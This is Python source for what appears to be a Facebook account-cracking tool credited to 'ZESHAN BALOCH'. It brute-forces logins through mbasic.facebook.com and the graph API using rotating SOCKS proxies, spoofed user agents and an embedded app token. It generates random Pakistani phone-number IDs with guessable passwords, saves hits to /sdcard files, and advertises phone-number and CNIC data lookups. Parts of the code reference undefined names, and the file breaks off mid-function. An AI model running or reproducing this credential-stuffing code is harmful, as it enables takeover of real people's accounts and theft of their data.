import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install dnslib pypi')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python axi.py')
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 10; SM-N960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a;'] 
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00FF00"
except FileNotFoundError:
	color_table = "#00FF00"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
try:
	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
prox=open('.prox.txt','r').read().splitlines()

ugen2=[]
ugen=[]

for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
awan =[
'FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/309.0.0.34.24;FBBV/37634260;FBDM/{density=1.5,width=720,height=720};FBLC/en_PK;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T561;FBSV/10.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/124.0.0.30.16;FBBV/15892275;FBDM/{density=1.5,width=720,height=720};FBLC/en_US;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/6.2.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/139.0.0.40.77;FBBV/23166078;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_PK;FBCR/Salaam Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/6.3.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/243.0.0.17.125;FBBV/31991540;FBDM/{density=1.7,width=720,height=1280};FBLC/en_PK;FBCR/Salaam Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/5.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/215.0.0.5.51;FBBV/34292145;FBDM/{density=2.9,width=1280,height=720};FBLC/en_US;FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5100;FBSV/11.1.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/313.0.0.29.140;FBBV/13240560;FBDM/{density=1.1,width=1280,height=1440};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9190;FBSV/10.3.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'Dalvik/2.1.0 (Linux; U; Android 11 Build/5991; TECNO Model3) [FBAN/382.1.3.0;FBBV/658821977;FBRV/7;com.facebook.katana;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model3;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.6,width=1017,height=1801};FB_FW/3;]',
'FBAN/FB4A;FBAV/287.0.0.1.80;FBBV/54403826;FBDM/{density=1.75,width=1280,height=1280};FBLC/en_GB;FBCR/DOCTYPE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/7.5.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/423.0.0.20.72;FBBV/50792482;FBDM/{density=7.5,width=1280,height=1280};FBLC/en_GB;FBCR/DOCTYPE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/4.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/144.0.0.20.95;FBBV/65109116;FBDM/{density=1.5,width=720,height=1080};FBLC/en_US;FBCR/Salaam Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T531;FBSV/9.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/189.0.0.23.123;FBBV/66553397;FBDM/{density=2.75,width=720,height=1280};FBLC/en_GB;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T561;FBSV/13.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/312.0.0.33.10;FBBV/41254058;FBDM/{density=2.0,width=1080,height=720};FBLC/en_PK;FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/9.5.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'FBAN/FB4A;FBAV/266.0.0.7.68;FBBV/25118960;FBDM/{density=1.9,width=1080,height=1440};FBLC/en_GB;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/11.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi',]

def S2():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = ";[FBAN/FB4A;FBAV/266.0.0.7.68;FBBV/25118960;FBDM/{density=1.5,width=1080,height=1440};FBLC/en_GB;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/11.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2176};FBLC/it_IT;FBRV/0;FBCR/vodafone IT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	ua = s + e	
	return ua
	
logo=("""\033[1;92m     
##
       ZESHAN BALOCH
\033[1;31m\033[1;37m
 Author    : ZESHAN BALOCH
 Github    : ZESHANHASHIR
 Facebook  : ZESHAN BALOCH
 Tool Name : Z X B
 Tool Type : \033[1;31mFREE\033[1;37m
 Version   : \033[1;32m0.7\033[1;37m
\033[1;31m\033[1;37m""")           
def linex():
	print('\33[1;37m--------------------------------------------------')
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
def menu():
	
	        
			
			os.system('clear')
			print(logo)
			print('[1] File Cloning menu')
			print('[2] Pak Random Cloning menu')
			print('[3] BD Random Cloning menu')
			print('[4] Random Choice Pass ')
			print('[5] Get any  number data')
			print('[6] Get any CNIC number data')
			print('[7] Follow me on Facebook')
			print('\x1b[1;91m[8] Exit main menu')
			linex()
			rifat=input(' Choose an option: ')
			if rifat in ['1','01']:
				os.system('clear')
				print(logo)
				
				linex()
				print(' Example : /sdcard/ZESHAN.txt')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				os.system('clear')
				print(logo)
				print('[1] File Method\x1b[1;92m [1] \n\x1b[1;97m[2] File Method \x1b[1;92m[2]')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					os.system('clear')
					print(logo)
					print(' Example : 1 , 2 ,3, 4 ,5 ,6 ,7 ,8, 9 ,****,Etc')
					linex()
					ps_limit = int(input(' Putt pass lemit : '))
				except:
					ps_limit =1
				os.system('clear')
				print(logo)
				print(' Example : first last,firstlast,first12345,***Etc')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				os.system('clear')
				print(logo)
				print(' Do you want Show Cookies : ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=25) as crack_submit:
					os.system('clear')
					print(logo)
					total_ids = str(len(fo))
					print(' Total Accounts   : '+total_ids)
					print(' Selected Method : \x1b[1;92mM '+mthd)
					print(' \x1b[1;91mIf you no result use flight mode')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(mmm,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python axi.py')
			elif rifat in ['2','02']:
				rifat1()
			elif rifat in ['3','03']:
				bd()
			elif rifat in ['4','04']:
				chos()
			elif rifat in ['5','05']:
				zong()
			elif rifat in ['6','06']:
				cinc()
			elif rifat in ['7','07']:
				os.system('xdg-open https://www.facebook.com/ZeshanBAloch.5678');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
				exit(' Option not found in menu...')
		
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mZESHAN\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(S2())
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			
			session.headers.update({"Host":"mbasic.facebook.com", "content-type":"application/x-www-form-urlencoded","upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-langrge":  "en-US;q=0.8,en;q=0.7"})
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
			AXI=session.cookies.get_dict().keys()
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				
				print('\033[1;92m[ZESHAN-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/ZESHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XD:
				if 'y' in pcp:
					
					print('\33[1;31m[ZESHAN-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ZESHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
client_id = '6628568379'
client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
version = str(random.randrange(8,15))
osv = str(random.randrange(1,9))
abv = ['A','B','C']
                
if '8' in version:
    ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
elif '9' in version:
    ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
elif '10' in version:
    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
elif '11' in version:
    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
elif '12' in version:
    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
elif '13' in version:
    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
elif '14' in version:
    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
elif '15' in version:
    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
application_version_code=str(random.randint(000000000,999999999))
ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mZESHAN\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
    
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua = random.choice(ugen)
			ua1=random.choice(S2())
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			head = {'User-Agent':ua1,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			getlog = session.get(f'https://graph.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			complete = session.post('https://graph.facebook.com/auth/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
			AXI=session.cookies.get_dict().keys()
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[ZESHAN-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/ZESHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XD:
				if 'y' in pcp:
					print('\33[1;91m[ZESHAN-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ZESHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
def rifat1():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Pak Random Method (best) \x1b[1;92m[1]')
	print('\x1b[1;97m[2] Pak Random Method \x1b[1;92m[2]')
	print('\x1b[1;97m[3] Pak Random Method \x1b[1;92m[3]')
	print('\x1b[1;97m[4] Pak Random Method \x1b[1;92m[4]')
	print('\x1b[1;97m[5] Pak Random Method (best) \x1b[1;92m[5]')
	print('\x1b[1;97m[6] Pak Random Method \x1b[1;92m[6]')
	print('\x1b[1;91m[7] Go to main menu')
	linex()
	opt = input('[√] SELECT OPT: ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_number3()
	elif opt =='4':
		random_number4()
	if opt =='5':
		random_number5()
	if opt =='6':
		random_number6()
	
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()
#____
def random_number1():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print(' Example : 1000,5000,10000,****Etc')
	linex()
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#____
def random_number2():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#____________
def bd():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] BD Randm Method\x1b[1;92m [1]')
	print('\x1b[1;97m[2] BD Randm Method \x1b[1;92m[2]')
	print('\x1b[1;97m[3] BD Randm Method \x1b[1;92m[3]')
	print('\x1b[1;91m[4] Go to main menu')
	linex()
	rifat=input('Select option :')
	if rifat =='1':
		bd1()
	if rifat =='2':
		bd2()
	if rifat =='3':
		bd3()
	if rifat =='4':
		menu()
	else:
		print(' Select option');menu()

#_______
def random_number3():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'khankhan','khan12','khan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#___________
def random_number4():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#_____
def random_number5():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122','khan12']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#___
def random_number6():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'baloch','malik12','baloch12','baloch12345','malik12345']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#____
def bd1():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
	linex()
